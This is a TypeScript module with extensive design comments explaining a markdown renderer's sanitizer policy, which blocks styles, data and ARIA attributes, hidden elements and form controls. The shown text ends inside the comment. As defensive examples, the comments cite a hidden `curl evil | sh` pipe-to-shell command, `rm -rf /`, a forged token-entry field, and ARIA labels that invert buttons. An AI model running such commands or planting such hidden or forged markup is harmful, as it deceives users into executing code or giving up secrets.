// The renderer's ONE markdown path (P2-E19-03 extracted it; P2-E16-01 gave it
// the configuration).
//
// It was inline in `extensibility/feed-blocks.tsx` and had exactly one caller;
// the update dialog is the second, the §5.30 document viewer is the third, and
// three copies of a `marked` + DOMPurify pipeline is three sanitizer
// configurations that drift apart — the security configuration drifting with
// them. DESIGN.md §5.30 states the single renderer as a REQUIREMENT for that
// reason, so it is code, not a convention: nothing outside this file imports
// `marked` or `dompurify`, and `markdown.test.tsx` asserts that.
//
// P2-E16-01 finished the extraction by naming the options instead of inheriting
// whichever defaults the two libraries happen to ship. What the viewer adds on
// top (heading anchors, a language label and copy button on code fences, front
// matter as a chip, relative-link navigation) is P2-E16-02, and it lands HERE
// rather than beside the viewer — a second pipeline is the thing this file
// exists to prevent.
import React from 'react';
import { marked, Renderer } from 'marked';
import type { Tokens } from 'marked';
import DOMPurify from 'dompurify';
import type { Config as SanitizeConfig } from 'dompurify';

/** The "still typing" cue. A glyph, not copy — nothing here to translate. */
export const STREAMING_CARET = '▌';

/**
 * The GFM task-list marker, as a GLYPH instead of a disabled `<input>` (#612).
 *
 * This exists because of the line below it: `input` is in `FORBID_TAGS`, and a
 * task-list checkbox is the ONE thing in that whole set that markdown itself
 * emits — `marked` renders `- [ ] todo` as
 * `<li><input disabled="" type="checkbox"> todo</li>`. Forbidding the tag
 * without this would have deleted the marker from every checklist in the app
 * and left a stray leading space, which is the `align` trap one file over: a
 * security list that silently eats a construct the parser really produces.
 *
 * IT IS A SUBSTITUTION, NOT A LOSS OF THE MARKER, and that is what makes
 * forbidding the tag cost nothing on screen. `marked` writes that input
 * `disabled`, ALWAYS — there is no markdown that produces an enabled one (its
 * `checkbox()` renderer hard-codes it; verified against the shipped 18.0.7) —
 * so the checkbox was never a control: it is decoration, drawn with a control.
 * The glyph also takes the reader's THEME, which a platform checkbox does not.
 *
 * WHAT IT DOES COST, named rather than glossed because every other empirical
 * claim in this file was measured and this one cannot be from here: a disabled
 * checkbox conveys done/not-done as STATE, which a screen reader announces; a
 * `☐` conveys it as a CHARACTER, and whether a given screen reader speaks
 * U+2610 depends on its symbol dictionary and verbosity setting. It may say
 * nothing. That is a real trade and it is accepted — the tag is the thing, and
 * an unlabelled disabled checkbox was announcing state with no name attached
 * to it either — but it wants a check with a real screen reader before anyone
 * writes it down as an improvement. (It is also a divergence from GitHub,
 * which renders GFM task lists as `<input type=checkbox disabled>`.)
 *
 * The trailing space is `marked`'s own — its default `checkbox()` emits
 * `<input …> ` and the item text follows, so dropping it would run the marker
 * into the first word.
 *
 * NOT `aria-hidden` and NOT a `<span class>`, for two different reasons.
 * `SANITIZE_CONFIG` runs AFTER this and `ALLOW_ARIA_ATTR: false` strips the
 * first. It does NOT strip the second — DOMPurify keeps `class` and no config
 * flag filters by prefix, which this file says 100 lines down — but a `doc-`
 * or `feed-` prefixed one would be taken by `stripDecorationNamespace`, which
 * runs before each surface decorates, and an un-namespaced one would survive
 * into a stylesheet that has no rule for it. A bare glyph needs neither, and
 * has nothing for content to forge that it could not forge by typing the
 * character.
 */
export const TASK_GLYPH = { checked: '☑', unchecked: '☐' } as const;

class TaskListGlyphRenderer extends Renderer {
  override checkbox({ checked }: Tokens.Checkbox): string {
    return `${checked ? TASK_GLYPH.checked : TASK_GLYPH.unchecked} `;
  }
}

/**
 * The ONE parser configuration.
 *
 * Written out rather than left to `marked`'s defaults so that a version bump
 * that changes one of them is a diff on this line instead of a silent change of
 * behaviour in two surfaces at once.
 *
 *  - `async: false` — the return type is the string, not a promise. Rendering
 *    happens inside `useMemo`, which cannot await.
 *  - `gfm: true` — tables, task lists, strikethrough and autolinks. This is
 *    what agents actually emit (§5.30), and it is already `marked`'s default;
 *    naming it makes it a decision rather than an inheritance.
 *  - `breaks: false` — a single newline is not a `<br>`. GFM's own rule, and
 *    the one that keeps a hard-wrapped paragraph from rendering as a ladder.
 *  - `renderer` — `marked`'s own, with ONE method replaced: the task-list
 *    checkbox (#612, see `TaskListGlyphRenderer`). It is an instance rather
 *    than `marked.use({ renderer })` deliberately: `use` mutates the library's
 *    GLOBAL defaults, which would make this module's configuration reach code
 *    that never imported it — the opposite of the thesis this file is built on.
 *    Passing the instance per parse keeps the change scoped to this call, and
 *    it must be an instance and not an object literal: `marked` 18 takes an
 *    options `renderer` as the WHOLE renderer, so a literal with one method on
 *    it throws `this.renderer.<token> is not a function` on the first token.
 *
 *    ONE INSTANCE, SHARED BY EVERY PARSE, and that is safe for a reason worth
 *    knowing before someone reaches for `async: true`: `marked`'s `Parser`
 *    WRITES to the renderer you hand it (`renderer.options`, `renderer.parser`)
 *    on every parse. With `async: false` every parse runs to completion
 *    synchronously, so no two can interleave. An async parse would cross that
 *    state between documents. It is also why the instance itself is NOT frozen
 *    below — freezing it makes `marked` throw on the first parse.
 */
export const MARKED_OPTIONS = {
  async: false,
  gfm: true,
  breaks: false,
  renderer: new TaskListGlyphRenderer(),
} as const;

// FROZEN for `SANITIZE_CONFIG`'s reason, which reached this constant when #612
// put POLICY in it. It used to be three booleans; it now carries the renderer
// that is the sole reason `input` can be in `FORBID_TAGS`, so
// `MARKED_OPTIONS.renderer = new Renderer()` from anywhere in the renderer
// process would put the disabled `<input>` back — into a pipeline that then
// deletes it, silently eating every checklist marker in the app.
//
// SHALLOW, and deliberately: the renderer instance cannot be frozen (see
// above). What this closes is the swap, not the method — one of the two, and
// the one a stray line is likely to be. Safe to freeze at all because `marked`
// copies options into a fresh object per parse rather than writing to ours;
// verified against the shipped 18.0.7.
Object.freeze(MARKED_OPTIONS);

/**
 * The ONE sanitizer configuration. §5.29 in a constant. ONE — see the `style`
 * note below, and `markdown.test.tsx`'s surface table, which pins it.
 *
 * `USE_PROFILES: { html: true }` is the base, and it is narrower than
 * DOMPurify's default, which also allows SVG and MathML. Markdown never
 * produces either — they can only arrive as RAW EMBEDDED MARKUP in a file we
 * did not write, which is precisely the input §5.30 says to distrust. §5.30
 * also settles the SVG question directly: "SVG via `<img>` and never inlined so
 * it cannot carry script". An `<img src="x.svg">` still renders under this
 * profile; an inline `<svg>` with an `onload` does not survive it. The `<style>`
 * TAG is already outside the profile, and that is the bigger of the two CSS
 * holes: a stylesheet is not scoped to the block that carried it.
 *
 * `style` in `FORBID_ATTR` closes the other one (#436). The viewer used to strip
 * `style` on its own, in `document-render.ts`, which made TWO effective profiles
 * out of one constant — the exact drift §5.30 names as the reason the single
 * renderer is a requirement. It is settled HERE, for every surface, because:
 *
 *  - MARKDOWN CANNOT EMIT ONE. Every construct that looks like it might uses an
 *    attribute instead — GFM table alignment renders `align="right"`, not
 *    `style="text-align:right"` — and this app ships no syntax highlighter that
 *    writes colours inline. Nothing legitimate is lost; `markdown.test.tsx`
 *    renders the whole GFM surface and proves it.
 *  - SO AN INLINE STYLE IS ALWAYS RAW EMBEDDED MARKUP. Measured on the real
 *    corpus before choosing (2026-08-13): 7,553 captured transcripts, 57,700
 *    assistant text blocks, 93 MB of prose — SEVEN occurrences of `style`, all
 *    seven inside a code fence or code span, where `marked` escapes them to text
 *    and the sanitizer never sees an attribute at all. Bare in prose: zero.
 *  - AND IT IS LOAD-BEARING FOR THE VIEWER. `position:fixed;inset:0` from a file
 *    we did not write is a click-jack over the app's own chrome, and
 *    `display:none` is what hides the `<pre>` whose Copy button then puts
 *    something else on the clipboard. The feed is the same input class — an
 *    agent can be talked into emitting markup — so it gets the same answer.
 *  - AND IT FIGHTS THE THEME. `.feed-md` and `.doc-md` own how markdown looks;
 *    an inline `color:` outranks every one of their rules and survives a theme
 *    switch, so light-on-light is a thing a reply could do to itself.
 *
 * WHAT `style` DID NOT CLOSE ON ITS OWN, so nobody reads the above as more than
 * it is: colouring text never needed `style`. The html profile also allows the
 * LEGACY PRESENTATIONAL attributes — `<font color size face>`, `<hr color
 * size>`, `bgcolor` — so between #436 and #466 "markdown can no longer colour
 * itself" was FALSE; what was true is that it could not do so through `style`,
 * and could not POSITION itself (there is no `position: fixed` rule anywhere in
 * the renderer's CSS for a `class` to borrow, and `class` does survive). That
 * set is #466, and it is the FIFTH block below.
 *
 * `decoration-guard.ts` still removes `style` in every surface's take-back pass,
 * and that is deliberate belt-and-braces for HTML that reaches a decoration pass
 * from anywhere but here — not a second profile. See the note in that file.
 *
 * `ALLOW_DATA_ATTR: false` closes the THIRD one, and it is the same argument one
 * step further out (#465). DOMPurify keeps every `data-*` attribute by default,
 * and this app's surfaces decorate with data attributes and then read them back
 * off the DOM as instructions: the viewer's `data-doc-*` (#410) and the feed's
 * `data-feed-expander` / `data-feed-seq` / `data-no-toggle` (#465). The DOM does
 * not remember who wrote an attribute, so a reply carrying a forged one is
 * giving the surface orders — it wedges the feed's arrow-key navigation on a
 * phantom expander, and captures a find jump, because `querySelector` answers
 * with the first match in document order and the forgery can sit above the real
 * block. MARKDOWN EMITS NO DATA ATTRIBUTES AT ALL — every `data-*` that reaches
 * a surface is therefore raw embedded markup, the input §5.30 says to distrust —
 * so nothing legitimate is lost, and the whole class of decoration forgery is
 * closed here, once, for surfaces that do not exist yet.
 *
 * It is the FIRST of two layers, not the only one: `decoration-guard.ts` is the
 * per-surface take-back, and it is what still covers `class` (which DOMPurify
 * keeps and no config flag filters by prefix) and any caller that builds HTML
 * without coming through this function. Consequence worth knowing before you
 * read a green test as proof: pipeline-level forgery tests that enter through
 * `renderMarkdown` now stay green even if a surface's guard is deleted, because
 * this line got there first. `decoration-guard.test.ts` and
 * `document-render.test.ts` therefore call the guard DIRECTLY, so removing it
 * still reds.
 *
 * `ALLOW_ARIA_ATTR: false` plus `role` in `FORBID_ATTR` closes the FOURTH, and
 * it is the accessibility half of the same argument (#509). DOMPurify keeps
 * every `aria-*` attribute by default — `ALLOW_ARIA_ATTR` defaults to `true` —
 * and `role` is not covered by that flag at all: it is an ordinary member of the
 * html profile's attribute allow-list, so turning the flag off and stopping
 * there would drop `aria-label` and keep `role="alert"`. Both go, and they go
 * together, because they are ONE decision: WAI-ARIA is what a screen reader
 * reads, and `role` is the half of it with teeth.
 *
 * ANNOUNCED, BUT NEVER OBEYED. Nothing in this app acts on ARIA that arrived in
 * content. There is no live region wired to authored markup, no focus manager
 * reading an authored `aria-controls`, and — since `ALLOW_DATA_ATTR: false` —
 * no interactive semantics that survive at all. So an authored `aria-*` reached
 * exactly one audience: the screen reader, which announced it as though the app
 * meant it. That is a channel that exists FOR AT USERS ONLY, and every payload
 * on it is a lie the sighted reader cannot see:
 *
 *  - `aria-live="assertive"` on a reply is a region that interrupts whatever the
 *    user was being told, on content's own schedule — including the app's own
 *    `role="status"` announcements (§5.10's feed, the approval bar), which it
 *    can talk over.
 *  - `aria-label` on visible text REPLACES that text in the accessible name. A
 *    `<span aria-label="Cancel">Approve</span>` reads as the opposite of what is
 *    on screen, which is the approvals surface's whole trust model inverted for
 *    one class of user.
 *  - `aria-hidden="true"` removes real content from the accessibility tree
 *    entirely — the sighted reader sees `rm -rf /`, the screen-reader user is
 *    told nothing is there. `role="presentation"` does the same to a table.
 *  - `role="link"` is not merely announced: `DocumentViewer.tsx` reads it back
 *    off the live DOM in its keydown handler (`getAttribute('role') === 'link'`
 *    gates Enter/Space activation), because `decorateLinks` writes it to put the
 *    affordance back on links whose `href` it removed. That is the #410 shape
 *    exactly — a surface's own protocol, speakable by its input — and it is the
 *    reason `role` could not be left as "harmless noise".
 *
 * MARKDOWN EMITS NEITHER. Not one construct in GFM produces an `aria-*` or a
 * `role`; the accessible structure of rendered markdown comes from the TAGS
 * (`<table>`, `<h1>`, `<ul>`), which is exactly where it belongs. So every one
 * that reaches a surface is raw embedded markup. Measured the same way #436
 * measured `style`, on the same machine's corpus (2026-08-19): 7,475 captured
 * transcripts, 17,908 assistant text blocks, 10 MB of prose — 39 occurrences of
 * `aria-*=` and 92 of `role=`, and NOT ONE of them was an attribute on a tag.
 * All 39 aria hits and 91 of the role hits were inside a code fence or code
 * span, where `marked` escapes them to text and the sanitizer never sees an
 * attribute; the 92nd was prose ABOUT a dialog ("`AboutPanel` (role=dialog,
 * Escape/click-away…)"), which is likewise text. Bare on a tag: zero.
 *
 * WHAT STILL CARRIES ARIA, and this is the part worth knowing before reading a
 * screen reader's output: everything the surfaces write themselves. The
 * decoration passes run AFTER this function — `decorateLinks`' `role="link"`,
 * `decorateTables`' `role="group"`, `decorateImages`' `aria-hidden` icon,
 * `decorateFeedCodeFences`' `aria-label` on the Copy button — and React writes
 * the chrome's own. The rule this line establishes is therefore not "rendered
 * content has no ARIA"; it is that EVERY piece of ARIA in a rendered surface is
 * ours. `decoration-guard.ts` does NOT take these back (they are not in any
 * surface's `data-`/class namespace), so unlike `data-*` this has no second
 * layer: the profile is the whole policy, which is why its test block is
 * profile-level and why a surface that renders markdown some other way is
 * caught by the surface table in the `style` block rather than by a guard.
 *
 * `hidden` and `tabindex` were named here as still open when this block was
 * written, and both are closed by the next one — for reasons that belong to this
 * one as much as to #466's, because `hidden` is an accessibility attribute
 * wearing presentational clothes and `tabindex` is a channel aimed at exactly
 * the same user.
 *
 * `color`, `bgcolor`, `face`, `size`, `hidden` and `tabindex` in `FORBID_ATTR`
 * close the FIFTH (#466 + #598): the pre-CSS half of the `style` argument, plus
 * the one attribute in the set that is not about looks at all. DOMPurify's html
 * profile allows all six — they are ordinary members of its attribute
 * allow-list, so no flag reaches them and each has to be named, the way `role`
 * did. Verified against DOMPurify 3.4.12, not assumed.
 *
 * THE FOUR PRESENTATIONAL ONES ARE `style` WITH THE CSS TAKEN OUT. `<font
 * color="#fff" size="7" face="…">`, `<hr color size>` and `bgcolor` on a cell
 * repaint content the theme owns, exactly as an inline `color:` did, and they
 * outrank `.feed-md` and `.doc-md` and survive a theme switch the same way.
 * Nothing they can do is as bad as what `style` could — none of them positions —
 * but leaving them was the difference between the release note and the truth:
 * 0.4.0 told users a reply could no longer "repaint itself in colours your theme
 * didn't choose" and then had to add that `<font color>` and its relatives still
 * could, "shutting those down is still to come" (#436, shipped as PR #464). This
 * is that.
 *
 * `hidden` IS THE ONE WITH TEETH, and it is not presentational at all: it
 * removes content from the rendering AND from the accessibility tree, which
 * makes it `aria-hidden`'s more thorough sibling — #509's argument, arriving on
 * a legacy attribute. The Copy button is what makes it concrete.
 * `decorateCodeFences` (viewer) and `decorateFeedCodeFences` (feed) wrap EVERY
 * `<pre>` in a header with a language label and a Copy button, deliberately: the
 * forged-wrapper variant is closed by the guard pass running first, so a `<pre>`
 * is wrapped whatever it claimed to be. A `<pre hidden>` therefore renders as a
 * code header with a working Copy button and NO VISIBLE CODE, and the handler
 * reads `pre.textContent` at click time — a clipboard the reader cannot inspect
 * before pasting it into a shell. `<p hidden>` beside a visible one is the same
 * trick without the button: text that is in the document, in the DOM and in a
 * find (neither find walker skips `[hidden]`), and not on the screen.
 *
 * `popover` IS THE SAME ATTACK IN THIS DECADE'S SPELLING, and it is on this list
 * because review found it still open after `hidden` was closed — one attribute
 * over, in the same allow-list. Chromium's UA sheet is
 * `[popover]:not(:popover-open) { display: none }`, nothing in `tokens.css`
 * overrides `display` on a `<pre>`, and DOMPurify keeps the attribute: so
 * `<pre popover>` reproduced the invisible-Copy-button case verbatim. Verified
 * against the shipped 3.4.12 with this exact config, not reasoned about.
 * `popovertarget` / `popovertargetaction` go with it — they are the invoker half
 * of the same feature, and no rendered surface has a popover for content to aim
 * at. `inert` is the third of the family: it does not hide the pixels, it takes
 * the subtree out of the accessibility tree AND out of focus, so it is
 * `aria-hidden` (#509) with the keyboard taken too. `background` comes along as
 * the last of the painting set — `<table background="x.png">` is `bgcolor` with
 * an image, and CSP (`default-src 'self'`) is what stops it fetching, which is a
 * different layer's job.
 *
 * `tabindex` IS A FOCUS-ORDER CHANNEL (#598). Authored content can put itself in
 * the tab order (`<span tabindex="0">`) or reorder the page's (`tabindex="1"`
 * beats every natural stop in the document). With `role` and `data-*` gone
 * nothing ACTIVATES on it — this is a nuisance, not a forgery — but it is a
 * nuisance aimed squarely at the keyboard and screen-reader user: a reply can
 * add forty tab stops to a conversation the app deliberately made ONE tab stop
 * (#174 — the feed is one stop and the arrows move inside it). Every `tabindex`
 * a surface needs is written AFTER this function: `decorateTables`' scroll
 * container (`0`, because a scroll box only a mouse can reach is unreachable),
 * the links `decorateLinks` did not BLOCK (it strips `href` from every link and
 * then returns early on a blocked one, which is deliberately left without a tab
 * stop), the feed Copy button's `-1`. So #509's rule extends as far as this
 * attribute reaches: every tab stop content can MAKE FOR ITSELF with `tabindex`
 * is gone.
 *
 * NOT "every tab stop in a rendered surface is ours", and the difference is
 * worth the sentence: `<button>`, `<input>`, `<select>` and `<textarea>` WERE in
 * DOMPurify's TAG allow-list, and a native control is focusable without any
 * `tabindex` at all, so a forged `<button>` in a reply WAS still a tab stop.
 * That is the SIXTH block, and #612 took it.
 *
 * MARKDOWN EMITS NONE OF THEM, and the one attribute that looks adjacent is
 * why `align` is deliberately NOT on this list: GFM table alignment renders as
 * `<th align="right">`, so forbidding `align` would silently un-align every
 * table in the app. That divergence from "strip the legacy set" is pinned by a
 * test rather than by this sentence — and `align` survives on ANY element, not
 * only a cell, so `<p align="center">` is still something content can do. That
 * is the price of not un-aligning every table in the app, and it is paid
 * knowingly.
 *
 * Measured the way #436 measured `style` and #509 measured ARIA, on the same
 * machine's corpus (2026-08-19): 7,486 captured transcripts, 18,086 assistant
 * text blocks, 10 MB of prose — `color=` 5, `bgcolor=` 0, `background=` 1,
 * `face=` 1, `size=` 20, `popover` 27, `inert` 61, `tabindex` 43, and `hidden`
 * 266 counting the bare English word. NOT ONE of them was an attribute on a tag.
 * Every hit was inside a code fence or code span, where `marked` escapes it to
 * text and the sanitizer never sees an attribute, or was prose using the word
 * ("**Color = tumor type**", "a hidden sleep breathing problem", "roving
 * tabindex", a review discussing a "no-JS popover approach"). Bare on a tag:
 * zero, for every one of them.
 *
 * `FORBID_TAGS` closes the SIXTH, and it is the first block on this list that
 * is about ELEMENTS rather than attributes (#612). Seven tags in two groups,
 * and they are one decision only in the sense that they are one mechanism:
 *
 * `button`, `input`, `select`, `textarea` — THE NATIVE FOCUSABLES, and the
 * reason the `tabindex` paragraph above could not claim what it wanted to. A
 * native control is focusable with NO `tabindex` at all, so stripping the
 * attribute never touched them: a forged `<button>` in a reply was still a tab
 * stop, wearing a label it chose. #465's audit of the feed found that shape and
 * bounded it ("UI redress on the keyboard path, not script execution"); what it
 * could not do was close it, because the tag is the thing.
 *
 * A TEXT BOX IS WORSE THAN A BUTTON, and it is what settles `input` and
 * `textarea` rather than the focus argument alone: a reply can draw an entry
 * field, and the reader has no way to tell a field the app drew from a field a
 * reply drew — the DOM does not remember who wrote an element any more than it
 * remembers who wrote an attribute (#465's sentence, one layer up). "Paste your
 * token to continue" under a text box, inside a conversation the user is
 * already typing into, is a phishing surface the app hosts on the attacker's
 * behalf.
 *
 * WHAT IT IS NOT, checked rather than assumed, because the obvious next step is
 * to claim exfiltration and the claim would be FALSE HERE: `<form>` is in the
 * html profile, `action` and `method` survive it, and the sanitizer really did
 * return `<form action="https://…"><input name="token">` intact (verified
 * against the shipped DOMPurify 3.4.12 with this exact config). But this app
 * names `form-action 'none'` in BOTH policies — `shared/csp.ts`, and
 * `markdown.test.tsx` already pins it with the sentence "recorded here rather
 * than papered over with a FORBID_TAGS entry". So nothing submits, with or
 * without these tags, and the harm this line closes is DECEPTION, not
 * transmission. `<form>` itself therefore stays allowed, exactly as that test
 * decided: with nothing to type into and nothing to submit with, it is a `<div>`
 * with a URL attached.
 *
 * `option`, `optgroup`, `datalist`, `rp` — THE REST OF THE FAMILY, added in
 * review, and they are on this list for #608's lesson rather than for a new
 * argument of their own: that item closed `hidden` and had to be told that
 * `popover` was the same attack one attribute over. These are the same shape one
 * TAG over.
 *
 *  - `datalist` IS `hidden` RESPELLED. The HTML rendering spec gives it
 *    `display: none`, DOMPurify allows it, and `KEEP_CONTENT` keeps its
 *    children — so `<datalist><pre>curl evil | sh</pre></datalist>` is a `<pre>`
 *    that is in the document, in the DOM and in a find, and not on the screen.
 *    That is #598's own stated harm for `<p hidden>`, and it arrived on the
 *    data source of the dropdown this item was already removing.
 *  - `option` and `optgroup` FINISH `select`. Forbidding the parent alone
 *    hoisted them out as orphaned elements rather than as text, which made
 *    "the element goes, its children stay" true only in the loosest sense.
 *  - `rp` IS A UA-HIDDEN TAG: `ruby > rp` is `display: none`, so
 *    `<ruby>x<rp>hidden</rp></ruby>` is `datalist` again in miniature. `ruby`
 *    and `rt` STAY — they show what they contain, and taking a whole
 *    typographic feature to close its parenthesis fallback would be the
 *    over-reach this list is trying not to be.
 *
 *    THIS BULLET SAID "THE LAST UA-HIDDEN TAG IN THE PROFILE" AND THAT WAS
 *    FALSE (corrected by #625, which was measuring one family over and checked).
 *    `<dialog>` is the other one, and it is in the SEVENTH block below.
 *
 * `center`, `marquee`, `font` — THE LEGACY TAGS, and this is the smaller half.
 * `<center>` aligns a block the theme did not, `<marquee>` moves content the
 * user did not ask to move (an animation with no `prefers-reduced-motion`
 * respect, because there is no CSS of ours for the media query to reach), and
 * `<font>` has been a bare inline box since #466/#598 took its attributes — an
 * element that now renders nothing at all, kept only by the profile's inertia.
 * None of them is a security hole. They go because they are the same question
 * asked of tags — content dictating presentation — and because the measurement
 * says they cost nothing.
 *
 * NOTHING LEGITIMATE IS LOST, and here that claim needed WORK rather than only
 * a measurement, because ONE of the eleven is emitted by markdown itself.
 * `marked` renders a GFM task list as `<li><input disabled="" type="checkbox">`,
 * so forbidding `input` and stopping there would have deleted the marker from
 * every checklist in the app — `align`'s trap, and the corpus says checklists
 * are the ONE construct here that real assistant prose actually writes
 * (9 task-list items, all of them bare in prose, versus zero bare uses of any
 * of the eleven tags). `MARKED_OPTIONS`' renderer draws that marker as a glyph
 * instead, ABOVE this comment and before the sanitizer ever sees it, so the
 * checklist keeps its box and the tag can go. That is the difference from
 * `align`, which had no such move available and therefore stayed.
 *
 * Measured the way #436 measured `style`, #509 measured ARIA and #466/#598
 * measured the presentational set, on the same machine's corpus (2026-08-20):
 * 7,590 captured transcripts, 18,386 assistant text blocks, 10.2 MB of prose —
 * `<font` 7, `<center` 5, `<marquee` 3, `<button` 35, `<input` 21, `<select` 2,
 * `<textarea` 6, `<datalist` 4, `<option` 2, `<optgroup` 1, `<rp` 2. EVERY ONE
 * of the 88 was inside a code fence or a code span, where `marked` escapes it to
 * text and the sanitizer never sees an element. BARE IN PROSE — the only form
 * that reaches DOMPurify as markup — zero, for every one of the eleven. (A tag
 * measurement asks a different question from an attribute one: the pattern IS
 * the element, so "on a tag" is true by construction and what decides the case
 * is fence/span versus bare.)
 *
 * THE CONTENT SURVIVES, THE ELEMENT DOES NOT. DOMPurify's `KEEP_CONTENT`
 * default is `true` and none of these eleven is in `FORBID_CONTENTS`, so
 * `<button>Approve</button>` renders as the word *Approve* and
 * `<center><h2>Title</h2></center>` keeps its heading. The reader still sees
 * everything the reply said — the property `FeedView.forgery.test.tsx` calls
 * "strips the attributes, not the message", now true of elements too.
 *
 * WHAT IS STILL FOCUSABLE IN RENDERED CONTENT, said plainly because the
 * `tabindex` block above got burned on exactly this: `<a href>` is a tab stop
 * and ORDINARY MARKDOWN EMITS ONE for every link, and `<summary>` is a tab stop
 * and `<details><summary>` is a collapsible section real agents write by hand.
 *
 * WHEN #612 WROTE THIS PARAGRAPH IT HAD TWO MORE ENTRIES — `<audio controls>` /
 * `<video controls>` ("the viewer replaces media with a chip; THE FEED HAS NO
 * SUCH PASS") and `<area href>` inside a `<map>`, filed as an exhaustive-list
 * footnote. Both are closed by the SEVENTH block below (#625), which measured
 * them and forbade the tags rather than giving the feed a pass of its own. What
 * is left is the two above, and they are there because MARKDOWN ITSELF WRITES
 * THEM.
 *
 * So "the conversation is ONE tab stop" (#174) is a statement about the app's
 * own CHROME, and it cannot be made true of content by any tag list that still
 * renders links. What #612 closes is narrower and is what the sentence should
 * say: CONTENT CANNOT PLANT A CONTROL — no button, no text box, no dropdown
 * (and after #625, no media player and no image-map hot spot). The form with
 * the exceptions attached is the honest one, and after #625 the list of
 * exceptions is finite and short enough to write down: EVERY TAB STOP IN
 * RENDERED CONTENT IS A LINK, A DISCLOSURE TRIANGLE, OR OURS. That sentence was
 * struck out here once as false; it is pinned by a test now rather than
 * asserted, because the way it became false the first time was by being written
 * down and not re-checked.
 *
 * The SEVENTH block is the rest of `FORBID_TAGS` (#625), and it exists because
 * #612 shipped with the paragraph above naming its own leftovers: MEDIA. The
 * document viewer replaces `<video>`/`<audio>` with a "media not shown" chip in
 * its decoration pass (`document-render.ts`, `stripMedia`); the feed has no such
 * pass and the update dialog has no decoration pass AT ALL, so `<audio
 * controls>` in a reply was a platform media player — a tab stop, a context
 * menu and a Download item — sitting inside assistant prose.
 *
 * IT IS SETTLED HERE RATHER THAN IN A FEED PASS, and that is the whole design
 * decision; the tag list is just the consequence. A surface pass would have
 * closed the feed and left `UpdateDialog.tsx` open, which renders release notes
 * FETCHED FROM GITHUB through `<Markdown>` with no `decorate` prop — content we
 * did not write, in a modal, with no pass to forget to add because there was
 * never one there. That is this file's own thesis arriving as evidence: the
 * profile is the layer that does not depend on a surface REMEMBERING, and the
 * `style` note four blocks up is the same argument in the other direction (the
 * viewer stripping `style` privately made two effective profiles out of one
 * constant).
 *
 * `audio`, `video`, `source`, `track`, `picture` — THE MEDIA FAMILY.
 *
 *  - `controls` IS THE FOCUS SWITCH, and it is measured, not reasoned: in
 *    Chromium 149 `<audio controls>` takes focus with no `tabindex` and lays out
 *    at 300×54, and the same element WITHOUT `controls` is not focusable at all.
 *    So this is the `<button>` case one tag over — the tag (plus one attribute
 *    the profile allows) is the thing, which is why `tabindex` never reached it.
 *  - AND IT FETCHES. A `src` on any of them is a request the moment the node
 *    reaches the page, plus `autoplay` and `loop`, which survive the profile.
 *    CSP `default-src 'self'` is what stops a remote one TODAY — a different
 *    layer, holding a hole this one should not be leaving to it.
 *  - `source` and `track` ARE THE CHILDREN, and they go for #612's `option` /
 *    `optgroup` reason: forbidding only the parent hoists them out as orphaned
 *    elements rather than as text. `<source srcset>` also fetches on its own
 *    inside a `<picture>`.
 *  - `picture` IS THEN A BARE WRAPPER around its `<img>` fallback, which
 *    `KEEP_CONTENT` keeps and which stays allowed. `<img>` IS NOT ON THIS LIST
 *    and must not be: markdown emits one for every `![alt](src)`, and the repo
 *    scan below found real READMEs writing `<img src>` by hand in prose.
 *
 * `map`, `area` — THE IMAGE-MAP FOOTNOTE #612 LEFT, and checking it is what
 * turned it from a footnote into an entry: `<area href>` inside a `<map>`
 * applied to a rendered image really does take focus in Chromium 149. #612
 * called it "unreachable in practice" on the strength of the VIEWER chipping
 * every `<img>` — but the feed has no image pass either, so in a reply the image
 * renders and its hot spots are live. Both go, for the `option`/`optgroup`
 * reason again: `map` alone leaves orphaned `<area>`s.
 *
 * `canvas` — THE WEAKEST ENTRY ON THIS LIST, said plainly. It is not focusable
 * and it cannot be drawn into: content cannot run script (`script-src 'self'`,
 * and DOMPurify refuses `on*` anyway), so a `<canvas>` in rendered markdown
 * renders NOTHING, ever. That is `<font>`'s argument from the sixth block — an
 * element kept only by the profile's inertia — with one addition: `width` and
 * `height` survive (they are in the layout set two paragraphs down), and a
 * `<canvas width="40" height="400">` measures 40×400 of empty box in Chromium
 * 149. A reply can therefore push its own text off the screen with a spacer.
 * A nuisance, named as one.
 *
 * `dialog` — NOT MEDIA, and it is here because #625 checked the sixth block's
 * claim that `rp` was the last UA-hidden tag in the profile and found it false.
 * `dialog:not([open])` is `display: none` in the UA sheet; verified in Chromium
 * 149, where a `<pre>` inside a closed `<dialog>` measures 0×0. That is
 * `datalist` exactly — a `<pre>` in the document, in the DOM, in a find, with a
 * working Copy button and no visible code — so it is fixed where it was found
 * rather than filed for later.
 *
 * WHAT NEEDED NO ENTRY, checked rather than assumed, because the obvious list to
 * write is the one in `stripMedia`: `iframe`, `embed`, `object`, `param` and
 * inline `<svg>` are NOT in DOMPurify's html profile at all and never survived
 * this function. Verified against the shipped 3.4.12 with this exact config.
 * Adding them would be a line that reads as protection and does nothing, and the
 * thing that would actually notice a profile change upstream is a test — so they
 * are pinned in `markdown.test.tsx` instead of named here.
 *
 * TWO CORPORA, because these tags have TWO input classes and the usual one
 * cannot speak for the viewer. Same method as #436 (`style`), #509 (aria/role),
 * #466/#598 (the presentational set) and #612 (the control tags):
 *
 *  - THE FEED's input is assistant prose. On this machine, 2026-08-20: 7,602
 *    captured transcripts, 18,639 assistant text blocks, 10.2 MB — `<audio` 5,
 *    `<video` 3, `<canvas` 1, `<map` 2, `<area` 3, `<iframe` 1, and ZERO for
 *    `<source`, `<track`, `<picture`, `<embed`, `<object`, `<param`, `<dialog`.
 *    Every one of the 15 was inside a code span, where `marked` escapes it to
 *    text and the sanitizer never sees an element. BARE IN PROSE: zero.
 *  - THE VIEWER's input is FILES, so the transcript corpus cannot price its
 *    chip. Scanned the markdown on this machine's project roots the same day:
 *    1,182 `.md` files, 15.4 MB — `<video` 2, `<audio` 3, `<source` 1,
 *    `<picture` 1, `<canvas` 7, `<map` 5, `<area` 1, `<iframe` 1, `<embed` 1,
 *    `<object` 1, `<track` 0, `<dialog` 0. Every one inside a fence or a span.
 *    BARE IN PROSE: zero — so the "media not shown" chip fires on NONE of the
 *    1,182 real documents, and what this costs the viewer is measured rather
 *    than argued. In the same scan `<img` had THREE bare-in-prose uses (a README
 *    centring screenshots by hand), which is the whole reason `img` stays.
 *
 * MARKDOWN EMITS NONE OF THEM. `marked` has no construct that produces a media,
 * embed or image-map element — `![alt](src)` is an `<img>` and that is the end
 * of the overlap — so unlike #612 this needed no renderer of its own. The GFM
 * surface is rendered in `markdown.test.tsx` and asserted against the whole
 * list, because #612's `input` is the lesson that this claim gets checked.
